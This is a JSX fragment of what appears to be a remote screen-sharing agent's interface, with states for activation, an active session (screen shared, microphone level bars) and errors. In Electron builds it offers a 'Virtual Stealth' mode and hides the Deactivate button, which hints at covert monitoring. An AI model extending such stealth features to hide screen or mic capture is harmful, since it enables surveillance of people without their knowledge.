          <div className="w-full max-w-md text-center">
            <Monitor className="w-14 h-14 text-zinc-300 mx-auto mb-6" strokeWidth={1} />
            <h1 className="font-heading text-3xl font-black tracking-tighter text-zinc-950 mb-2">
              Agent Ready
            </h1>
            <p className="text-sm text-zinc-500 mb-1">{deviceName}</p>
            <p className="font-mono text-xs text-zinc-400 mb-8">{deviceId}</p>
            {error && <div className="text-sm text-rose-600 mb-4" data-testid="activate-error">{error}</div>}
            <button
              onClick={handleActivate}
              className="bg-[#002FA7] hover:bg-[#001D66] text-white px-8 py-4 font-medium text-lg transition-colors inline-flex items-center gap-3"
              data-testid="activate-btn"
            >
              <Power className="w-5 h-5" strokeWidth={1.5} />
              Activate Agent
            </button>
            <button
              onClick={() => navigate('/')}
              className="block mx-auto mt-6 text-sm text-zinc-400 hover:text-zinc-600 transition-colors"
              data-testid="back-to-landing"
            >
              Back to home
            </button>
          </div>
        </div>
      )}

      {/* ACTIVE */}
      {status === 'active' && (
        <div className="min-h-screen flex flex-col">
          <div className="bg-white border-b border-zinc-200 px-6 py-3 flex items-center justify-between shrink-0">
            <div className="flex items-center gap-3">
              <div className="w-2.5 h-2.5 bg-green-500 rounded-full agent-pulse" />
              <span className="font-heading font-bold text-zinc-950">{deviceName}</span>
              <span className="font-mono text-xs text-zinc-400">{deviceId}</span>
            </div>
            <div className="flex items-center gap-3">
              {IS_ELECTRON && (
                <button
                  onClick={() => stealthModeActive ? agentDisableStealthMode() : agentEnableStealthMode()}
                  className={`text-xs transition-colors flex items-center gap-1.5 px-3 py-1.5 rounded ${
                    stealthModeActive
                      ? 'bg-blue-600 text-white hover:bg-blue-700'
                      : 'text-zinc-500 hover:text-blue-600 border border-zinc-200 hover:border-blue-300'
                  }`}
                  data-testid="stealth-mode-btn"
                  title={stealthModeActive ? 'Disable virtual display stealth mode' : 'Enable virtual display stealth mode'}
                >
                  <Shield className="w-3.5 h-3.5" strokeWidth={1.5} />
                  {stealthModeActive ? 'Virtual Stealth ON' : 'Virtual Stealth'}
                </button>
              )}
              {!IS_ELECTRON && (
                <button
                  onClick={handleDeactivate}
                  className="text-xs text-zinc-400 hover:text-rose-600 transition-colors flex items-center gap-1.5"
                  data-testid="deactivate-btn"
                >
                  <Power className="w-3.5 h-3.5" strokeWidth={1.5} />
                  Deactivate
                </button>
              )}
            </div>
          </div>
          <div className="flex-1 flex items-center justify-center p-6">
            <div className="text-center">
              {viewerConnected ? (
                <>
                  <Wifi className="w-16 h-16 text-green-500 mx-auto mb-6" strokeWidth={1} />
                  <h2 className="font-heading text-2xl sm:text-3xl font-bold text-zinc-950 mb-2">
                    Viewer Connected
                  </h2>
                  <p className="text-sm text-zinc-500">Your screen is being shared</p>

                  {/* Mic visualizer */}
                  {micActive && (
                    <div className="mt-6 flex flex-col items-center gap-2">
                      <div className="flex items-center gap-1.5">
                        <div className="w-2 h-2 bg-red-500 rounded-full animate-pulse" />
                        <span className="text-xs text-zinc-500 font-mono">MIC ACTIVE</span>
                      </div>
                      <div className="flex items-end gap-1 h-10">
                        {micBars.map((vol, i) => (
                          <div
                            key={i}
                            className="w-2 rounded-sm bg-green-500 transition-all duration-75"
                            style={{
                              height: `${Math.max(4, vol * 0.4)}px`,
                              opacity: vol > 5 ? 1 : 0.3,
                            }}
                          />
                        ))}
                      </div>
                    </div>
                  )}
                </>
              ) : (
                <>
                  <div className="w-16 h-16 rounded-full border-2 border-dashed border-zinc-300 flex items-center justify-center mx-auto mb-6">
                    <Monitor className="w-8 h-8 text-zinc-300" strokeWidth={1} />
                  </div>
                  <h2 className="font-heading text-2xl sm:text-3xl font-bold text-zinc-950 mb-2">
                    Agent Active
                  </h2>
                  <p className="text-sm text-zinc-500">Waiting for a viewer to connect...</p>
                </>
              )}
            </div>
          </div>
        </div>
      )}

      {/* ERROR */}
      {status === 'error' && (
        <div className="min-h-screen flex items-center justify-center p-6">
          <div className="text-center">
            <Shield className="w-10 h-10 text-rose-400 mx-auto mb-4" strokeWidth={1.5} />
            <p className="text-sm text-rose-600 mb-2" data-testid="error-msg">{error}</p>
            <p className="text-xs text-zinc-400">Retrying automatically...</p>
          </div>
        </div>
      )}
    </div>
  );
}
